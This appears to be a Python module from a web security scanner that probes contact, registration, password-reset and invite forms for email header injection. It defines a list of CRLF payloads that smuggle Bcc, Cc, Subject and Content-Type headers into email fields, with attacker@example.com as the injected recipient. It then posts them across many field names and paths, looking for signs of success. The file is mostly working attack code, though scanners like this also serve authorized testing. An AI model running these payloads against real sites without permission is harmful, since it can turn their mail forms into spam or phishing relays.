"""email_header_injection — CRLF in email fields (contact/register forms)"""
from core.http import HttpClient

# CRLF payloads for email injection
PAYLOADS = [
    "test@example.com%0aBcc:attacker@example.com",
    "test@example.com%0d%0aBcc:attacker@example.com",
    "test@example.com\nBcc:attacker@example.com",
    "test@example.com\r\nBcc:attacker@example.com",
    "test@example.com%0aCc:attacker@example.com",
    "test@example.com%0aContent-Type:text/html",
    "test@example.com%0aSubject:injected",
    "\"test@example.com\"%0aBcc:attacker@example.com",
    "test@example.com%00%0aBcc:attacker@example.com",
]

# endpoints with email fields
EMAIL_PATHS = ["/contact", "/feedback", "/register", "/signup", "/subscribe",
               "/newsletter", "/api/contact", "/api/feedback", "/api/register",
               "/api/subscribe", "/forgot-password", "/password/reset",
               "/invite", "/api/invite", "/share", "/api/share"]

MARKERS = ["bcc:", "cc:", "subject:", "content-type:", "attacker@example.com",
           "invalid header", "header injection", "smtp"]


class EmailHeaderInjection:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)
        findings = []

        for path in EMAIL_PATHS:
            r0 = http.get(base + path)
            if not r0 or r0.status_code == 404: continue
            print(f"[email] {path} ({r0.status_code})")

            for payload in PAYLOADS[:4]:
                for field in ["email", "to", "from", "recipient", "mail", "address"]:
                    r = http.post(base + path, data={field: payload,
                                                     "message": "test", "name": "test"})
                    if not r: continue
                    low = r.text.lower()
                    hit = next((m for m in MARKERS if m in low), None)
                    if hit:
                        print(f"  [!] {field}={payload[:30]} -> {hit}")
                        findings.append({"path": path, "field": field,
                                         "payload": payload, "marker": hit,
                                         "severity": "high"})
                        logger.finding("email_injection", "high",
                                       f"{path} {field}={payload[:40]}")

        print(f"[email] total: {len(findings)}")
        return {"findings": findings}
